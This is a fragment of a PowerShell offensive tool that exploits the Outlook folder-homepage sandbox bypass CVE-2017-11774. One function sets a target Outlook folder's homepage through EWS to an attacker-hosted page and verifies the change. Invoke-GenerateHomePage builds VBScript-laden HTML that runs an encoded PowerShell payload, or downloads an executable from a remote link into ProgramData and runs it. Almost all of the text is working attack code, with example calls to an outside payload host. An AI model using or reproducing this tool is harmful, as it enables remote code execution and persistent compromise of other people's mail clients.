                 }
          
                 $asciiChars = $folderHomePageValue -split '(..)' | Where-Object {$_} |ForEach-Object {[char][convert]::ToInt16($_,16)}
                 $folderHomePageValue = $asciiChars -join ''
                 $folderHomePageValue = $folderHomePageValue.ToString().Substring(4)
                 Write-Host "[Info]:Current Folder HomePage: " $folderHomePageValue " (Can be taken note of for later restore )" -ForegroundColor Yellow 


        }

    }

    Write-Host "[+]: Setting Homepage $HomePage For Folder Name '$TargetFolder' ..." -ForegroundColor DarkYellow
    Start-Sleep -s 2

    $rootFolder.Load()
  
    $folders = $rootFolder.FindFolders($fv)

    foreach ($folder in $folders){
        if( $folder.DisplayName -eq $TargetFolder){
                [Byte[]]$homePageURL = HexStringToByteArray(GetHomepageValue($HomePage));
                $folder.SetExtendedProperty($PR_FOLDER_WEBVIEWINFO,$homePageURL);
                $folder.update();
                Write-Host "[+] HomePage $HomePage successfully set for" $folder.DisplayName -ForegroundColor Green;
        }
    }

    #Checking
    Write-Host "`r`n"
    $psPropertySet.Add($PR_FOLDER_WEBVIEWINFO);
    $fv.PropertySet = $psPropertySet 
    $rootFolder.Load()
    $folders = $rootFolder.FindFolders($fv)

    foreach ($folder in $folders){
    
        $folderHomePage = $null;  
        $folderHomePageValue = 0  

        if( $folder.DisplayName -eq $TargetFolder ){

                 if ($folder.TryGetProperty($PR_FOLDER_WEBVIEWINFO,[ref] $folderHomePage)){   
                            $folderHomePageValue = ($folderHomePage|ForEach-Object ToString X2) -join '' -replace '00',''
                 }
                 
                 $asciiChars = $folderHomePageValue -split '(..)' | Where-Object {$_} |ForEach-Object {[char][convert]::ToInt16($_,16)}                            
                 $folderHomePageValue = $asciiChars -join ''
                 $folderHomePageValue = $folderHomePageValue.ToString().Substring(4)

                 Write-Host "[+]:Current Folder HomePage: " $folderHomePageValue -ForegroundColor Green 


        }

    }


}


function Invoke-GenerateHomePage{

     <#
    .SYNOPSIS
    
        A PowerShell function for generating and html page embedding the VBSCRIPT code for "CVECVE-2017-11774" (Outlook client sandbox bypass), the function accepts
        a powershell encoded payload or a link for a remotely hosted payload (exe, dll, hta ..etc).
        
    .DESCRIPTION
    
        A PowerShell function for generating and html page embedding the VBSCRIPT code for "CVECVE-2017-11774" (Outlook client sandbox bypass), the function accepts
        a powershell encoded payload or a link for a remotely hosted payload (exe, dll, hta ..etc).
        The generated page should be placed on a public/accessible web server, next Set-HomePage function can be used to set such home page as a folder homepage
        for a specific outlook user.
        More on Set-HomePage => Get-Help Set-HomePage
        
    .PARAMETER PowershellPayload
    
        Powershell Encoded payload 
    
    .PARAMETER PayloadLink
    
        Link pointing to payload (exe, dll, hta ..etc) hosted on public/accessible server.
   
    .EXAMPLE
 
        PS C:\> Invoke-GenerateHomePage -PowershellPayload 'ABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFM.......QBkAFQAbwBFAG4AZAAoACkAOwA='

        Generates an html page embedding the VBscript code which would trigger the execution of the specified powershell encoded payload.



        PS C:\> Invoke-GenerateHomePage -PayloadLink 'https://categorized_domain.com/outlook.exe'

        Generate an html page embedding the VBscript code which would download a payload from "https://categorized_domain.com/outlook.exe" and save it to 
        C:\\ProgramData\\outlook.exe" the execute it.


        
    .NOTES
    
        Sample script created by; @med0x2e
    #>

    [CmdLetBinding()]
    param(
        
        [Parameter(Mandatory=$false)]
        [string]
        $PowershellPayload,

        [Parameter(Mandatory=$false)]
        [string]
        $PayloadLink
    )

     if($PSBoundParameters.ContainsKey('PowershellPayload') -and $PSBoundParameters.ContainsKey('PayloadLink')){

        Get-Help $MyInvocation.MyCommand
        return

     }else{

        $rootPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('.\')
     
        if($PSBoundParameters.ContainsKey('PowershellPayload')){
            
            $_homePagePath = $rootPath+"\html\_homeB.html"
            $_homepage = Get-Content $_homePagePath
            $_homepage = $_homepage -replace 'POWERSHELL_ENCODED_PAYLOAD', $PowershellPayload

            Write-Host "`r`n"
            Write-Host "[+]: HomePage HTML Source :`r`n" -ForegroundColor Green
            $_homePage | Write-Host -ForegroundColor Gray

            
        }elseif($PSBoundParameters.ContainsKey('PayloadLink')){

            $_homePagePath = $rootPath+"\html\_homeA.html"
            $_homepage = Get-Content $_homePagePath
            $_homepage = $_homepage -replace 'HTTP_PAYLOAD', $PayloadLink

            Write-Host "`r`n"
            Write-Host "[+]: HomePage HTML Source :`r`n" -ForegroundColor Green
            $_homePage | Write-Host -ForegroundColor Gray
                
        }else{
                Get-Help $MyInvocation.MyCommand
                return
        }


     }


}